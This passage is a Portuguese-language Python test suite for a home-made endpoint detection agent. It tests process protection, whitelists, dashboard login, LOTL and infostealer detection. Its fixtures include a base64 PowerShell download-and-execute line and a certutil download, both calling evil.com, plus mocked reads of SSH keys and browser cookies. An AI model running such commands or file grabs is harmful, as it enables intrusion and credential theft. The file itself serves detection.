import unittest
import sys
import os
import json
import shutil
import psutil
from pathlib import Path
import base64
import time

# Adiciona o diretório do projeto ao PATH
sys.path.insert(0, str(Path(__file__).parent))

import config
import mitigacao
import detector_processos
import dashboard
import detector_tokens

class TestFixes(unittest.TestCase):
    
    # --- PROBLEMA 1: Testes de PID inválidos no Windows / macOS / Linux ---
    def test_pid_protection(self):
        print("\n[TEST] Iniciando teste do Problema 1: Proteção de PID por OS")
        if sys.platform.startswith("win32"):
            # Encontra um PID vital real ativo no Windows
            pid_critico = None
            nome_critico = None
            for p in psutil.process_iter(['pid', 'name']):
                try:
                    if p.info['name'].lower() in ['csrss.exe', 'services.exe', 'lsass.exe']:
                        pid_critico = p.info['pid']
                        nome_critico = p.info['name']
                        break
                except:
                    pass
            self.assertIsNotNone(pid_critico, "Falha ao encontrar processo crítico no Windows para o teste.")
            res = mitigacao.matar_processo(pid_critico)
            print(f"Tentativa de encerrar {nome_critico} (PID {pid_critico}): {res}")
            self.assertIn("Bloqueado", res)
        else:
            # Em Linux e macOS, PID 1 é sempre systemd ou launchd
            res = mitigacao.matar_processo(1)
            print(f"Tentativa de encerrar PID 1: {res}")
            self.assertIn("Bloqueado", res)
        
        # Protege contra matar o próprio processo
        res_self = mitigacao.matar_processo(os.getpid())
        print(f"Tentativa de encerrar processo do agente: {res_self}")
        self.assertIn("Bloqueado", res_self)
        print("✅ Teste do Problema 1 concluído com sucesso!")

    # --- PROBLEMA 2: Whitelist inteligente e whitelist.json ---
    def test_whitelist_intelligence(self):
        print("\n[TEST] Iniciando teste do Problema 2: Whitelist Inteligente")
        whitelist_path = Path(detector_processos.__file__).parent / "whitelist.json"
        
        # Cria um whitelist.json temporário para teste
        backup_exists = whitelist_path.exists()
        if backup_exists:
            shutil.copy(whitelist_path, str(whitelist_path) + ".bak")
            
        teste_dados = {
            "processos": ["excecao_teste.exe"],
            "caminhos": [
                "C:\\Users\\roger\\AppData\\Local\\excecoes_teste\\",
                "AppData\\Roaming\\Claude",
                "AppData\\Local\\Packages\\Claude_"
            ]
        }
        with open(whitelist_path, "w", encoding="utf-8") as f:
            json.dump(teste_dados, f)
            
        try:
            # Mock de dados de processo
            class MockProcessInfo:
                def __init__(self, pid, name, exe, username):
                    self.info = {
                        'pid': pid,
                        'name': name,
                        'exe': exe,
                        'username': username
                    }
                    
            # 1. Deve ignorar caminho contendo \Programs\
            proc1 = MockProcessInfo(9991, "legitimo1.exe", "C:\\Users\\roger\\AppData\\Local\\Programs\\App\\legitimo1.exe", "user")
            # 2. Deve ignorar processo explicitado na whitelist
            proc2 = MockProcessInfo(9992, "excecao_teste.exe", "C:\\Users\\roger\\AppData\\Local\\Temp\\excecao_teste.exe", "user")
            # 3. Deve ignorar caminho explicitado na whitelist
            proc3 = MockProcessInfo(9993, "qualquer.exe", "C:\\Users\\roger\\AppData\\Local\\excecoes_teste\\qualquer.exe", "user")
            # 4. Deve detectar caminho suspeito sem whitelist
            proc4 = MockProcessInfo(9994, "suspeito.exe", "C:\\Users\\roger\\AppData\\Local\\Temp\\suspeito.exe", "user")
            # 5. Deve ignorar processos legítimos do Windows (explorer.exe, SearchHost.exe, sihost.exe)
            proc_explorer = MockProcessInfo(9995, "explorer.exe", "C:\\Windows\\explorer.exe", "user")
            proc_search = MockProcessInfo(9996, "SearchHost.exe", "C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchHost.exe", "user")
            proc_sihost = MockProcessInfo(9997, "sihost.exe", "C:\\Windows\\System32\\sihost.exe", "user")
            # 6. Deve ignorar Claude (blender-mcp.exe em AppData\Roaming\Claude)
            proc_claude = MockProcessInfo(9998, "blender-mcp.exe", "C:\\Users\\roger\\AppData\\Roaming\\Claude\\Claude Extensions\\ant.dir.gh.blender.blender-mcp\\.venv\\Scripts\\blender-mcp.exe", "user")
            
            wl = detector_processos.carregar_whitelist()
            self.assertIn("excecao_teste.exe", wl["processos"])
            
            # Mockando psutil.process_iter para o teste
            orig_iter = psutil.process_iter
            psutil.process_iter = lambda attrs: [proc1, proc2, proc3, proc4, proc_explorer, proc_search, proc_sihost, proc_claude]
            
            try:
                alertas = detector_processos.verificar_processos_suspeitos()
                pids_alertados = [a['detalhes']['pid'] for a in alertas]
                print(f"PIDs alertados nos testes de whitelist: {pids_alertados}")
                self.assertNotIn(9991, pids_alertados, "Falha: \\Programs\\ não foi ignorado.")
                self.assertNotIn(9992, pids_alertados, "Falha: excecao_teste.exe da whitelist não foi ignorado.")
                self.assertNotIn(9993, pids_alertados, "Falha: caminho da whitelist não foi ignorado.")
                self.assertNotIn(9995, pids_alertados, "Falha: explorer.exe legítimo foi marcado como disfarçado.")
                self.assertNotIn(9996, pids_alertados, "Falha: SearchHost.exe legítimo foi marcado como disfarçado.")
                self.assertNotIn(9997, pids_alertados, "Falha: sihost.exe legítimo foi marcado como disfarçado.")
                self.assertNotIn(9998, pids_alertados, "Falha: blender-mcp.exe (Claude) não foi ignorado.")
                self.assertIn(9994, pids_alertados, "Falha: processo suspeito em Temp não foi detectado.")
            finally:
                psutil.process_iter = orig_iter
                
        finally:
            if backup_exists:
                shutil.move(str(whitelist_path) + ".bak", whitelist_path)
            else:
                if whitelist_path.exists():
                    os.remove(whitelist_path)
        print("✅ Teste do Problema 2 concluído com sucesso!")

    # --- TESTE ADICIONAL: Normalização de Alertas (Problema 1) ---
    def test_alert_normalization(self):
        print("\n[TEST] Iniciando teste de normalização de alertas (Problema 1)")
        # Simula alertas mistos (dicionários e strings)
        alertas_brutos = [
            {'tipo': 'cpu_alta', 'mensagem': 'CPU ALTA: 90%', 'detalhes': {}},
            "Alerta bruto em formato string",
            {'tipo': 'processo_suspeito'}  # Dicionário incompleto sem chave mensagem
        ]
        
        # Lógica de normalização idêntica a do verificar_sistema em agente.py
        alertas_normalizados = [
            {'tipo': 'generico', 'mensagem': a, 'detalhes': {}} if isinstance(a, str) else a
            for a in alertas_brutos
        ]
        for a in alertas_normalizados:
            if 'mensagem' not in a:
                a['mensagem'] = ''
                
        self.assertEqual(alertas_normalizados[0]['mensagem'], "CPU ALTA: 90%")
        self.assertEqual(alertas_normalizados[1]['mensagem'], "Alerta bruto em formato string")
        self.assertEqual(alertas_normalizados[1]['tipo'], "generico")
        self.assertEqual(alertas_normalizados[2]['mensagem'], "")
        print("✅ Teste de normalização de alertas concluído com sucesso!")

    # --- PROBLEMA 3: Autenticação do dashboard Flask ---
    def test_dashboard_auth(self):
        print("\n[TEST] Iniciando teste do Problema 3: Autenticação do Dashboard")
        client = dashboard.app.test_client()
        
        # 1. Acesso à página inicial sem autenticação deve retornar 401 Unauthorized
        res = client.get('/')
        print(f"Acesso sem credenciais à página inicial: Status {res.status_code}")
        self.assertEqual(res.status_code, 401)
        
        # 2. Acesso ao API status sem autenticação deve retornar 401 Unauthorized
        res_api = client.get('/api/status')
        print(f"Acesso sem credenciais à API: Status {res_api.status_code}")
        self.assertEqual(res_api.status_code, 401)
        
        # 3. Acesso com credenciais corretas ("admin", "admin") deve retornar 200 OK
        import base64
        headers = {
            'Authorization': 'Basic ' + base64.b64encode(b"admin:admin").decode('utf-8')
        }
        res_auth = client.get('/', headers=headers)
        print(f"Acesso com credenciais corretas à página inicial: Status {res_auth.status_code}")
        self.assertEqual(res_auth.status_code, 200)
        
        res_api_auth = client.get('/api/status', headers=headers)
        print(f"Acesso com credenciais corretas à API: Status {res_api_auth.status_code}")
        self.assertEqual(res_api_auth.status_code, 200)
        
        # 4. Acesso com senha incorreta deve retornar 401 Unauthorized
        headers_err = {
            'Authorization': 'Basic ' + base64.b64encode(b"admin:senha_errada").decode('utf-8')
        }
        res_err = client.get('/', headers=headers_err)
        print(f"Acesso com credenciais erradas: Status {res_err.status_code}")
        self.assertEqual(res_err.status_code, 401)
        print("✅ Teste do Problema 3 concluído com sucesso!")

    # --- PROBLEMA 4: Monitoramento no macOS via FSEvents/Watchdog ---
    def test_macos_monitor(self):
        print("\n[TEST] Iniciando teste do Problema 4: Monitoramento no macOS via FSEvents/Watchdog")
        if sys.platform.startswith("darwin"):
            try:
                from watchdog.observers.fsevents import FSEventsObserver
                print("FSEventsObserver importado com sucesso!")
                self.assertTrue(True)
            except ImportError:
                self.fail("watchdog.observers.fsevents não pôde ser importado no macOS.")
        else:
            print("Ignorando teste do macOS (rodando em outra plataforma)")
        print("✅ Teste do Problema 4 concluído com sucesso!")

    # --- NOVO TESTE: Monitoramento de conexões e associação de processos ---
    def test_connection_monitoring(self):
        print("\n[TEST] Iniciando teste de associação de processo a conexões")
        import detector_ameacas
        # Mock do retorno da API para simular IP malicioso
        orig_consultar_ip = detector_ameacas.consultar_ip
        detector_ameacas.consultar_ip = lambda ip: {
            'ip': ip,
            'reputacao': -5,
            'total_pulsos': 3,
            'malwares': ['Redline'],
            'pais': 'Russia'
        }
        
        try:
            conexoes_mock = [{
                'ip': '198.51.100.2',
                'porta': 443,
                'pid': 1234,
                'processo': 'Discord.exe'
            }]
            alertas = detector_ameacas.verificar_ips_maliciosos(conexoes_mock)
            print(f"Alerta gerado para conexão mock suspeita: {alertas}")
            self.assertEqual(len(alertas), 1)
            self.assertEqual(alertas[0]['tipo'], 'ip_malicioso')
            self.assertIn("Discord.exe", alertas[0]['mensagem'])
            self.assertIn("1234", alertas[0]['mensagem'])
            self.assertEqual(alertas[0]['detalhes']['processo'], 'Discord.exe')
            self.assertEqual(alertas[0]['detalhes']['pid'], 1234)
            print("✅ Teste de associação de processos a conexões concluído com sucesso!")
        finally:
            detector_ameacas.consultar_ip = orig_consultar_ip
            
    # --- NOVO TESTE: Validação de 3 Fatores ---
    def test_3_factor_validation(self):
        print("\n[TEST] Iniciando teste de validação de 3 fatores simultâneos")
        
        # Mock class for psutil.Process
        class MockProcess:
            def __init__(self, pid, name, exe):
                self.pid = pid
                self._name = name
                self._exe = exe
                self.info = {'pid': pid, 'name': name, 'exe': exe}
            def name(self):
                return self._name
            def exe(self):
                return self._exe
            def kill(self):
                pass
                
        import subprocess
        from unittest.mock import MagicMock
        
        # Guard local references
        orig_run = subprocess.run
        orig_process = psutil.Process
        
        try:
            # 1. Caso Confiável: Nome ok + Caminho ok + Assinatura ok (Valid)
            mock_trusted = MockProcess(1234, "Discord.exe", "C:\\Users\\roger\\AppData\\Local\\Discord\\Discord.exe")
            
            # Mock subprocess.run to return Valid
            subprocess.run = MagicMock(return_value=MagicMock(stdout="Valid", returncode=0))
            
            status, msg, tipo = detector_processos.validar_processo_3_fatores(mock_trusted)
            print(f"Resultado confiável: {status}")
            self.assertEqual(status, "valido")
            
            # 2. Caso Masquerading: Nome ok + Caminho errado
            mock_masq = MockProcess(1235, "Discord.exe", "C:\\Users\\roger\\AppData\\Local\\Temp\\Discord.exe")
            status_masq, msg_masq, tipo_masq = detector_processos.validar_processo_3_fatores(mock_masq)
            print(f"Resultado masquerading: {status_masq} - {msg_masq}")
            self.assertEqual(status_masq, "masquerading")
            self.assertEqual(tipo_masq, "processo_masquerading")
            
            # 3. Caso Adulterado: Nome ok + Caminho ok + Assinatura inválida (status diferente de Valid)
            mock_adulterado = MockProcess(1236, "Discord.exe", "C:\\Users\\roger\\AppData\\Local\\Discord\\Discord.exe")
            subprocess.run = MagicMock(return_value=MagicMock(stdout="HashMismatch", returncode=1))
            status_ad = detector_processos.validar_processo_3_fatores(mock_adulterado)[0]
            print(f"Resultado adulterado: {status_ad}")
            self.assertEqual(status_ad, "adulterado")
            
            # 4. Caso Incompleto: erro ao ler o executável
            class MockProcessIncomplete:
                def __init__(self):
                    self.pid = 1237
                    self.info = {'pid': 1237, 'name': 'Discord.exe'}
                def name(self):
                    return "Discord.exe"
                def exe(self):
                    raise Exception("Acesso Negado")
            mock_inc = MockProcessIncomplete()
            status_inc, msg_inc, tipo_inc = detector_processos.validar_processo_3_fatores(mock_inc)
            print(f"Resultado incompleto: {status_inc} - {msg_inc}")
            self.assertEqual(status_inc, "incompleto")
            self.assertEqual(tipo_inc, "validacao_incompleta")
            
            # 5. Teste da Mitigação: matar_processo deve bloquear legítimos e permitir masquerades
            # Mocking psutil.Process instantiation
            def mock_process_init(pid_arg):
                if pid_arg == 1234:
                    return mock_trusted
                elif pid_arg == 1235:
                    return mock_masq
                raise psutil.NoSuchProcess(pid_arg)
                
            psutil.Process = mock_process_init
            
            # Se for confiável (PID 1234), matar_processo deve ser bloqueado
            subprocess.run = MagicMock(return_value=MagicMock(stdout="Valid", returncode=0))
            res_kill_trusted = mitigacao.matar_processo(1234)
            print(f"Tentativa de matar Discord confiável (PID 1234): {res_kill_trusted}")
            self.assertIn("Bloqueado", res_kill_trusted)
            
            # Se for masquerading (PID 1235), matar_processo deve permitir o encerramento
            res_kill_masq = mitigacao.matar_processo(1235)
            print(f"Tentativa de matar Discord mascarado (PID 1235): {res_kill_masq}")
            self.assertIn("encerrados", res_kill_masq)
            
            
        finally:
            subprocess.run = orig_run
            psutil.Process = orig_process
            
        print("✅ Teste de validação de 3 fatores concluído com sucesso!")

    # --- NOVO TESTE: Deduplicação de Alertas ---
    def test_alert_deduplication(self):
        print("\n[TEST] Iniciando teste de deduplicação de alertas por ciclo")
        
        # Simulamos uma lista de alertas brutos no mesmo ciclo contendo duplicados
        alertas_brutos = [
            {'tipo': 'cpu_alta', 'mensagem': 'CPU ALTA: 90%', 'detalhes': {'cpu': 90}},
            {'tipo': 'cpu_alta', 'mensagem': 'CPU ALTA: 95%', 'detalhes': {'cpu': 95}},  # Duplicado (mesmo tipo, sem caminho/ip/pid)
            {'tipo': 'arquivo_novo', 'mensagem': 'ARQUIVO NOVO: C:\\temp\\1.txt', 'detalhes': {'caminho': 'C:\\temp\\1.txt'}},
            {'tipo': 'arquivo_novo', 'mensagem': 'ARQUIVO NOVO: C:\\temp\\1.txt', 'detalhes': {'caminho': 'C:\\temp\\1.txt'}},  # Duplicado (mesmo tipo e caminho)
            {'tipo': 'ip_malicioso', 'mensagem': 'IP MALICIOSO: 8.8.8.8', 'detalhes': {'ip': '8.8.8.8'}},
            {'tipo': 'ip_malicioso', 'mensagem': 'IP MALICIOSO: 8.8.8.8', 'detalhes': {'ip': '8.8.8.8'}},  # Duplicado (mesmo tipo e ip)
            {'tipo': 'arquivo_novo', 'mensagem': 'ARQUIVO NOVO: C:\\temp\\2.txt', 'detalhes': {'caminho': 'C:\\temp\\2.txt'}},  # Não duplicado (caminho diferente)
        ]
        
        alertas_vistos = set()
        alertas_deduplicados = []
        for alerta in alertas_brutos:
            detalhes = alerta.get('detalhes', {})
            caminho = alerta.get('caminho') or detalhes.get('caminho', '')
            ip = alerta.get('ip') or detalhes.get('ip', '')
            pid = alerta.get('pid') or detalhes.get('pid', '')
            
            chave = f"{alerta['tipo']}:{caminho or ip or pid}"
            if chave in alertas_vistos:
                continue
            alertas_vistos.add(chave)
            alertas_deduplicados.append(alerta)
            
        print(f"Alertas após deduplicação: {len(alertas_deduplicados)} (esperado: 4)")
        self.assertEqual(len(alertas_deduplicados), 4)
        
        tipos_e_valores = [(a['tipo'], a['detalhes'].get('caminho') or a['detalhes'].get('ip') or '') for a in alertas_deduplicados]
        self.assertIn(('cpu_alta', ''), tipos_e_valores)
        self.assertIn(('arquivo_novo', 'C:\\temp\\1.txt'), tipos_e_valores)
        self.assertIn(('ip_malicioso', '8.8.8.8'), tipos_e_valores)
        self.assertIn(('arquivo_novo', 'C:\\temp\\2.txt'), tipos_e_valores)
        print("✅ Teste de deduplicação de alertas concluído com sucesso!")

    # --- NOVOS TESTES: LOTL e Infostealers ---
    def test_lotl_detection(self):
        print("\n[TEST] Iniciando teste de detecção de técnicas LOTL")
        import detector_lotl
        
        class MockProcessLOTL:
            def __init__(self, pid, name, exe, cmdline, ppid=None):
                self.pid = pid
                self.info = {
                    'pid': pid,
                    'name': name,
                    'exe': exe,
                    'cmdline': cmdline,
                    'ppid': ppid
                }
            def connections(self):
                return []
                
        # Simula PowerShell com Base64 suspeito
        payload_base64 = base64.b64encode(b"iex (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')").decode('utf-8')
        proc_ps = MockProcessLOTL(1001, "powershell.exe", "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "-enc", payload_base64])
        
        # Simula Certutil baixando arquivo
        proc_cert = MockProcessLOTL(1002, "certutil.exe", "C:\\Windows\\system32\\certutil.exe", ["certutil.exe", "-urlcache", "-split", "-f", "http://evil.com/mal.exe"])
        
        # Simula WMIC remoto e criação de processo
        proc_wmic = MockProcessLOTL(1003, "wmic.exe", "C:\\Windows\\system32\\wbem\\wmic.exe", ["wmic.exe", "process", "call", "create", "calc.exe"])
        proc_wmic_remote = MockProcessLOTL(1004, "wmic.exe", "C:\\Windows\\system32\\wbem\\wmic.exe", ["wmic.exe", "/node:10.0.0.5", "process", "list"])
        
        # Mocking psutil.process_iter
        orig_iter = psutil.process_iter
        psutil.process_iter = lambda attrs: [proc_ps, proc_cert, proc_wmic, proc_wmic_remote]
        
        try:
            alertas = detector_lotl.verificar_lotl()
            tipos = [a['tipo'] for a in alertas]
            print(f"Alertas LOTL gerados: {tipos}")
            self.assertIn('lotl_powershell_encodado', tipos)
            self.assertIn('lotl_certutil_suspeito', tipos)
            self.assertIn('lotl_wmic_criacao_processo', tipos)
            self.assertIn('lotl_wmic_remoto', tipos)
        finally:
            psutil.process_iter = orig_iter
            
        print("✅ Teste de detecção LOTL concluído!")

    def test_anomalous_parent_child(self):
        print("\n[TEST] Iniciando teste de relação parent-child anômala")
        import detector_lotl
        
        class MockParent:
            def __init__(self, name):
                self._name = name
            def name(self):
                return self._name
                
        class MockChild:
            def __init__(self, pid, name, ppid):
                self.pid = pid
                self.info = {
                    'pid': pid,
                    'name': name,
                    'exe': f"C:\\Windows\\System32\\{name}",
                    'cmdline': [name],
                    'ppid': ppid
                }
            def connections(self):
                return []
                
        proc_child = MockChild(2001, "cmd.exe", 2000)
        
        orig_iter = psutil.process_iter
        orig_process = psutil.Process
        
        psutil.process_iter = lambda attrs: [proc_child]
        psutil.Process = lambda pid: MockParent("winword.exe") if pid == 2000 else orig_process(pid)
        
        try:
            alertas = detector_lotl.verificar_lotl()
            tipos = [a['tipo'] for a in alertas]
            print(f"Alertas parent-child gerados: {tipos}")
            self.assertIn('comportamento_anomalo_parent_child', tipos)
        finally:
            psutil.process_iter = orig_iter
            psutil.Process = orig_process
            
        print("✅ Teste de parent-child anômalo concluído!")

    def test_infostealer_bulk_copy(self):
        print("\n[TEST] Iniciando teste de Infostealer (Cópia em Massa)")
        import detector_tokens
        
        # Reseta os acessos
        detector_tokens.acessos_detectados.clear()
        
        # Adiciona 3 acessos rápidos do mesmo PID (não legítimo) em arquivos diferentes
        t_base = time.time()
        detector_tokens.acessos_detectados.append({'caminho': 'C:\\Users\\roger\\.ssh\\id_rsa', 'pid': 9999, 'nome': 'malicioso.exe', 'timestamp': t_base})
        detector_tokens.acessos_detectados.append({'caminho': 'C:\\Users\\roger\\.gitconfig', 'pid': 9999, 'nome': 'malicioso.exe', 'timestamp': t_base + 0.1})
        detector_tokens.acessos_detectados.append({'caminho': 'C:\\Users\\roger\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies', 'pid': 9999, 'nome': 'malicioso.exe', 'timestamp': t_base + 0.2})
        
        alertas = detector_tokens.verificar_acesso_tokens()
        tipos = [a['tipo'] for a in alertas]
        print(f"Alertas de tokens gerados: {tipos}")
        self.assertIn('infostealer_copia_massa', tipos)
        self.assertNotIn('acesso_token_suspeito', tipos, "Não deve duplicar os alertas se for cópia em massa.")
        print("✅ Teste de Infostealer concluído!")

    def test_safe_tree_killing(self):
        print("\n[TEST] Iniciando teste de encerramento seguro por árvore")
        
        class MockProcessToKill:
            def __init__(self, pid, name):
                self.pid = pid
                self._name = name
                self.killed = False
            def name(self):
                return self._name
            def kill(self):
                self.killed = True
            def children(self, recursive=True):
                # Simula um processo filho (PID 8888) que não é crítico
                return [MockProcessToKill(8888, "child_evil.exe")]
                
        mock_proc = MockProcessToKill(7777, "evil.exe")
        
        # Mock do psutil.Process para retornar nosso mock_proc
        orig_process = psutil.Process
        psutil.Process = lambda pid: mock_proc if pid == 7777 else orig_process(pid)
        
        try:
            res = mitigacao.matar_processo(7777)
            print(f"Tentativa de encerrar árvore do PID 7777: {res}")
            self.assertTrue(mock_proc.killed)
            self.assertIn("Processo e descendentes encerrados", res)
        finally:
            psutil.Process = orig_process
            
        print("✅ Teste de encerramento seguro por árvore concluído!")

    # --- NOVOS TESTES: Monitoramento do Registro do Windows ---
    def test_registro_baseline(self):
        print("\n[TEST] Iniciando teste do detector de registro (Baseline)")
        import detector_registro
        detector_registro.construir_baseline_registro()
        baseline = detector_registro.baseline_registro
        if sys.platform.startswith("win32"):
            self.assertGreaterEqual(len(baseline), 0)
        else:
            self.assertEqual(len(baseline), 0)
        print("✅ Teste de baseline de registro concluído!")

    def test_registro_detect_changes(self):
        print("\n[TEST] Iniciando teste de detecção de alterações no registro")
        import detector_registro
        detector_registro.baseline_registro = {"HKLM\\Run\\test": "C:\\Windows\\test.exe"}
        
        # Mock obter_valores_registro para simular modificação e adição
        orig_obter = detector_registro.obter_valores_registro
        detector_registro.obter_valores_registro = lambda: {
            "HKLM\\Run\\test": "C:\\Windows\\modified.exe", # Modificado
            "HKLM\\Run\\new_val": "C:\\Windows\\new.exe"      # Novo
        }
        
        try:
            alertas = detector_registro.verificar_alteracoes_registro()
            tipos = [a['tipo'] for a in alertas]
            print(f"Alertas de registro gerados: {tipos}")
            self.assertIn("registro_persistência_modificado", tipos)
            self.assertIn("registro_persistência_novo", tipos)
        finally:
            detector_registro.obter_valores_registro = orig_obter
        print("✅ Teste de alteração de registro concluído!")

    # --- NOVOS TESTES: Correlação de IP e Supressão de Falsos Positivos ---
    def test_ip_alert_correlation(self):
        print("\n[TEST] Iniciando teste de correlação de IP e supressão de Falsos Positivos")
        import detector_ameacas
        
        # 1. Testes de Filtro de Conexão Externa (IPv4/IPv6 Loopback/ULA/Privados)
        self.assertFalse(detector_ameacas.eh_conexao_externa("127.0.0.1"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("0.0.0.0"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("192.168.1.100"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("::1"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("fe80::1ff:fe23:4567:890a"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("fc00::1"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("fdff::ffff"))
        
        # IPs externos válidos
        self.assertTrue(detector_ameacas.eh_conexao_externa("8.8.8.8"))
        self.assertFalse(detector_ameacas.eh_conexao_externa("2001:4860:4860::8888"))  # Google infra - ignorado
        self.assertTrue(detector_ameacas.eh_conexao_externa("2001:2000::1"))  # Outro externo válido
        
        # 2. Testes de Threshold Dinâmico de OTX
        # Chrome: threshold = 60
        dados_chrome_baixo = {'total_pulsos': 45, 'malwares': ['Legit-CDN'], 'hostname': 'google.com'}
        self.assertTrue(detector_ameacas.eh_falso_positivo("chrome.exe", "8.8.8.8", dados_chrome_baixo, houve_acesso_token=False))
        
        dados_chrome_alto = {'total_pulsos': 65, 'malwares': ['Legit-CDN'], 'hostname': 'google.com'}
        self.assertFalse(detector_ameacas.eh_falso_positivo("chrome.exe", "8.8.8.8", dados_chrome_alto, houve_acesso_token=False))
        
        # Telegram: threshold = 15
        dados_telegram_baixo = {'total_pulsos': 10, 'malwares': ['Telegram-CDN'], 'hostname': 'telegram.org'}
        self.assertTrue(detector_ameacas.eh_falso_positivo("telegram.exe", "149.154.167.99", dados_telegram_baixo, houve_acesso_token=False))
        
        dados_telegram_alto = {'total_pulsos': 20, 'malwares': ['Telegram-CDN'], 'hostname': 'telegram.org'}
        self.assertFalse(detector_ameacas.eh_falso_positivo("telegram.exe", "149.154.167.99", dados_telegram_alto, houve_acesso_token=False))
        
        # Processo não listado: threshold padrão = 5
        dados_desconhecido_baixo = {'total_pulsos': 3, 'malwares': ['Legit-CDN'], 'hostname': 'some-host.com'}
        # Não suprime porque não está nos processos confiáveis
        self.assertFalse(detector_ameacas.eh_falso_positivo("unknown_proc.exe", "8.8.8.8", dados_desconhecido_baixo, houve_acesso_token=False))
        
        print("✅ Teste de correlação de IP e supressão de Falsos Positivos concluído!")

    # --- NOVOS TESTES: Whitelist de Caminho Absoluto ---
    def test_token_whitelist_path_validation(self):
        print("\n[TEST] Iniciando teste de whitelist de caminho absoluto contra Process Masquerading")
        import detector_tokens
        
        # 1. Acesso legítimo: git.exe no caminho correto
        proc_legit = "C:\\Program Files\\Git\\cmd\\git.exe"
        arq_sensivel = "C:\\Users\\roger\\.gitconfig"
        self.assertTrue(detector_tokens.eh_acesso_legitimo(proc_legit, arq_sensivel))
        
        # 2. Tentativa de bypass (Process Masquerading): git.exe em pasta suspeita/inválida
        proc_bypass = "C:\\Users\\roger\\AppData\\Local\\Temp\\git.exe"
        self.assertFalse(detector_tokens.eh_acesso_legitimo(proc_bypass, arq_sensivel))
        
        # 3. Acesso legítimo: Discord no caminho wildcard
        proc_discord = "C:\\Users\\roger\\AppData\\Local\\Discord\\app-1.0.9000\\Discord.exe"
        arq_discord = "C:\\Users\\roger\\AppData\\Local\\Discord\\Local Storage\\leveldb"
        self.assertTrue(detector_tokens.eh_acesso_legitimo(proc_discord, arq_discord))
        
        print("✅ Teste de whitelist de caminho absoluto concluído!")

    def test_token_suppression_deduplication(self):
        print("\n[TEST] Iniciando teste de deduplicação de logs de supressão de tokens legítimos")
        import detector_tokens
        from io import StringIO
        import sys
        
        # Salva o stdout original para capturar logs
        orig_stdout = sys.stdout
        sys.stdout = StringIO()
        
        try:
            # Reseta o estado
            detector_tokens.reset_supressoes_ciclo()
            
            # Duas chamadas com os mesmos parâmetros devem imprimir apenas uma vez
            detector_tokens._logar_supressao("chrome.exe", "C:\\Users\\roger\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            detector_tokens._logar_supressao("chrome.exe", "C:\\Users\\roger\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            
            output = sys.stdout.getvalue()
            # Deve conter exatamente uma linha de ACESSO LEGÍTIMO SUPRIMIDO
            linhas = [l for l in output.splitlines() if "[ACESSO LEGÍTIMO SUPRIMIDO]" in l]
            self.assertEqual(len(linhas), 1, f"Deveria ter apenas 1 log de supressão, mas teve: {linhas}")
            self.assertIn("chrome.exe → C:\\Users\\roger\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", linhas[0])
            
            # Reseta e testa novamente
            detector_tokens.reset_supressoes_ciclo()
            sys.stdout = StringIO() # limpa buffer
            detector_tokens._logar_supressao("chrome.exe", "C:\\Users\\roger\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            output2 = sys.stdout.getvalue()
            linhas2 = [l for l in output2.splitlines() if "[ACESSO LEGÍTIMO SUPRIMIDO]" in l]
            self.assertEqual(len(linhas2), 1)
            
        finally:
            sys.stdout = orig_stdout
            
        print("✅ Teste de deduplicação de logs de supressão de tokens concluído!")

    def test_token_fallback_by_process_name(self):
        print("\n[TEST] Iniciando teste de fallback por nome do processo em tokens")
        import detector_tokens
        
        # Caso 1: exe_path é None, mas nome é legítimo (ex: discord.exe acessando leveldb)
        detector_tokens.acessos_detectados.clear()
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\AppData\\Local\\Discord\\Local Storage\\leveldb',
            'pid': 9991,
            'nome': 'discord.exe',
            'exe_path': None,
            'timestamp': time.time()
        })
        
        # Caso 2: exe_path é None, e o nome não é legítimo (ex: malicioso.exe acessando .gitconfig)
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\.gitconfig',
            'pid': 9992,
            'nome': 'malicioso.exe',
            'exe_path': None,
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        tipos = [a['tipo'] for a in alertas]
        
        # O discord.exe deve ser suprimido e não deve gerar alertas
        # O malicioso.exe deve gerar alerta de acesso suspeito
        self.assertIn('acesso_token_suspeito', tipos)
        pids_alertados = [a['detalhes']['pid'] for a in alertas if a['tipo'] == 'acesso_token_suspeito']
        self.assertIn(9992, pids_alertados)
        self.assertNotIn(9991, pids_alertados)
        print("✅ Teste de fallback por nome do processo concluído!")

    def test_ipv6_infraestrutura_ignorado(self):
        print("\n[TEST] Iniciando teste de IPv6 de infraestrutura ignorado")
        import detector_ameacas
        
        # 2001:4860::1 pertence ao Google (2001:4860:)
        self.assertFalse(detector_ameacas.eh_conexao_externa("2001:4860::1"))
        # 2606:4700::1 pertence à Cloudflare (2606:4700:)
        self.assertFalse(detector_ameacas.eh_conexao_externa("2606:4700::1"))
        
        # Um IPv6 externo aleatório que não esteja na lista de infraestrutura
        self.assertTrue(detector_ameacas.eh_conexao_externa("2001:2000::1"))
        print("✅ Teste de IPv6 de infraestrutura ignorado concluído!")

    def test_telegram_suprimido_com_hostname(self):
        print("\n[TEST] Iniciando teste de Telegram suprimido por hostname")
        import detector_ameacas
        import socket
        
        orig_gethostbyaddr = socket.gethostbyaddr
        # Mock para retornar um hostname contendo 'telegram' para o IP do Telegram
        socket.gethostbyaddr = lambda ip: ("gestaotg.telegram.org", [], []) if ip == "149.154.175.53" else orig_gethostbyaddr(ip)
        
        try:
            # Limpa cache do IP anterior se houver
            detector_ameacas.cache_ips.pop("149.154.175.53", None)
            
            # Simulamos que o IP está em cache_ips mas NÃO tem a chave hostname preenchida
            detector_ameacas.cache_ips["149.154.175.53"] = {
                "total_pulsos": 10,
                "malwares": ["Telegram-CDN"],
                "reputacao": 0,
                "pais": "United Kingdom"
            }
            
